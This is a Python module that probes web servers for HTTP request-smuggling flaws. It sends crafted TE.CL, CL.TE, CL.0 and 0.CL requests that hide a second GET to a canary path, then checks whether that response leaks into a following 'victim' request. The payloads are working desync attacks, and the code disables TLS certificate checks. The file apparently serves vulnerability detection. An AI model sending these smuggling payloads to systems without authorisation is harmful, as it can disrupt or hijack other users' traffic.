from socket import (IPPROTO_TCP, TCP_NODELAY, create_connection, socket,
                    timeout as SocketTimeout)
from ssl import CERT_NONE, create_default_context
from typing import Dict, List, Optional

from lib.canary import CanaryGenerator, _parse_status_line


DRAIN_TIMEOUT = 0.6


class CanaryProbe:
    def __init__(self, host: str, port: int, use_tls: bool, timeout: float) -> None:
        self.host = host
        self.port = port
        self.use_tls = use_tls
        self.timeout = timeout
        self.canary = CanaryGenerator()

    def _connect(self) -> socket:
        sock = create_connection((self.host, self.port), self.timeout)
        sock.settimeout(self.timeout)
        sock.setsockopt(IPPROTO_TCP, TCP_NODELAY, 1)
        if self.use_tls:
            ctx = create_default_context()
            ctx.check_hostname = False
            ctx.verify_mode = CERT_NONE
            sock = ctx.wrap_socket(sock, server_hostname=self.host)
        return sock

    def _drain(self, sock: socket, window: float = DRAIN_TIMEOUT) -> bytes:
        saved = sock.gettimeout()
        sock.settimeout(window)
        data = b""
        try:
            while True:
                try:
                    chunk = sock.recv(65535)
                except SocketTimeout:
                    break
                except OSError:
                    break
                if not chunk:
                    break
                data += chunk
        finally:
            try:
                sock.settimeout(saved)
            except OSError:
                pass
        return data

    @staticmethod
    def _status_of(data: bytes) -> int:
        if not data:
            return -1
        status = _parse_status_line(data)
        return status if status is not None else -1

    def _absorb_test(self, prefix: bytes, canary_path: str, endpoint: str,
                     host_header: str, repeat: int = 3) -> Dict[str, object]:
        victim = (
            f"GET {endpoint}?victim=1 HTTP/1.1\r\n"
            f"Host: {host_header}\r\n"
            f"\r\n"
        ).encode("latin-1")

        hits = 0
        pipelined = 0
        closed_after_prefix = 0
        valid_attempts = 0
        early_statuses: List[int] = []
        early_sample: Optional[bytes] = None

        for _ in range(repeat):
            sock = None
            try:
                try:
                    sock = self._connect()
                except OSError:
                    continue
                valid_attempts += 1
                try:
                    sock.sendall(prefix)
                except OSError:
                    closed_after_prefix += 1
                    continue
                early = self._drain(sock)
                status = self._status_of(early)
                early_statuses.append(status)
                if early_sample is None and early:
                    early_sample = early
                if self.canary.validate(early, canary_path):
                    pipelined += 1
                    continue
                try:
                    sock.sendall(victim)
                except OSError:
                    closed_after_prefix += 1
                    continue
                late = self._drain(sock)
                if self.canary.validate(late, canary_path):
                    hits += 1
            finally:
                if sock is not None:
                    try:
                        sock.close()
                    except OSError:
                        pass

        confidence = hits / valid_attempts if valid_attempts else 0.0
        reject_seen = any(400 <= s < 600 for s in early_statuses)
        needs_escalation = (
            hits == 0
            and (closed_after_prefix >= 2 or reject_seen or pipelined >= 2)
        )
        return {
            "canary_path": canary_path,
            "hits": hits,
            "valid_attempts": valid_attempts,
            "attempts": repeat,
            "pipelined": pipelined,
            "closed_after_prefix": closed_after_prefix,
            "early_statuses": early_statuses,
            "early_sample": early_sample,
            "confidence": confidence,
            "desync_suspected": confidence >= 0.67,
            "needs_escalation": needs_escalation,
            "raw": prefix,
        }

    def probe_tecl(self, endpoint: str, host_header: str) -> Dict[str, object]:
        canary_path = self.canary.new_path()
        smuggled = (
            f"GET {canary_path} HTTP/1.1\r\n"
            f"Host: {host_header}\r\n"
            f"\r\n"
        )
        prefix = (
            f"POST {endpoint} HTTP/1.1\r\n"
            f"Host: {host_header}\r\n"
            f"Content-Length: 4\r\n"
            f"Transfer-Encoding: chunked\r\n"
            f"\r\n"
            f"{len(smuggled):x}\r\n"
            f"{smuggled}"
            f"\r\n"
            f"0\r\n"
            f"\r\n"
        ).encode("latin-1", errors="replace")
        result = self._absorb_test(prefix, canary_path, endpoint, host_header)
        result["type"] = "TE.CL"
        return result

    def probe_clte(self, endpoint: str, host_header: str) -> Dict[str, object]:
        canary_path = self.canary.new_path()
        smuggled = (
            f"GET {canary_path} HTTP/1.1\r\n"
            f"Host: {host_header}\r\n"
            f"\r\n"
        )
        chunk_data = f"0\r\n\r\n{smuggled}"
        prefix = (
            f"POST {endpoint} HTTP/1.1\r\n"
            f"Host: {host_header}\r\n"
            f"Content-Length: {len(chunk_data.encode('latin-1'))}\r\n"
            f"Transfer-Encoding: chunked\r\n"
            f"\r\n"
            f"{chunk_data}"
        ).encode("latin-1", errors="replace")
        result = self._absorb_test(prefix, canary_path, endpoint, host_header)
        result["type"] = "CL.TE"
        return result

    def probe_cl0(self, endpoint: str, host_header: str) -> Dict[str, object]:
        canary_path = self.canary.new_path()
        smuggled = (
            f"GET {canary_path} HTTP/1.1\r\n"
            f"Host: {host_header}\r\n"
            f"\r\n"
        )
        prefix = (
            f"POST {endpoint} HTTP/1.1\r\n"
            f"Host: {host_header}\r\n"
            f"Content-Length: 0\r\n"
            f"\r\n"
            f"{smuggled}"
        ).encode("latin-1", errors="replace")
        result = self._absorb_test(prefix, canary_path, endpoint, host_header)
        result["type"] = "CL.0"
        return result

    def probe_0cl(self, endpoint: str, host_header: str) -> Dict[str, object]:
        canary_path = self.canary.new_path()
        smuggled = (
            f"GET {canary_path} HTTP/1.1\r\n"
            f"Host: {host_header}\r\n"
            f"\r\n"
        )
        prefix = (
            f"POST {endpoint} HTTP/1.1\r\n"
            f"Host: {host_header}\r\n"
            f"Content-Length: 0\r\n"
            f"Expect: 100-continue\r\n"
            f"\r\n"
            f"{smuggled}"
        ).encode("latin-1", errors="replace")
        result = self._absorb_test(prefix, canary_path, endpoint, host_header)
        result["type"] = "0.CL"
        return result

    def run_all(self, endpoint: str, host_header: str,
                include_cl0: bool = True) -> List[Dict[str, object]]:
        probes = [self.probe_tecl, self.probe_clte]
        if include_cl0:
            probes.extend([self.probe_cl0, self.probe_0cl])
        results = []
        for fn in probes:
            try:
                results.append(fn(endpoint, host_header))
            except OSError:
                results.append({"type": fn.__name__, "error": "connection_failed",
                                "desync_suspected": False,
                                "needs_escalation": False})
        return results
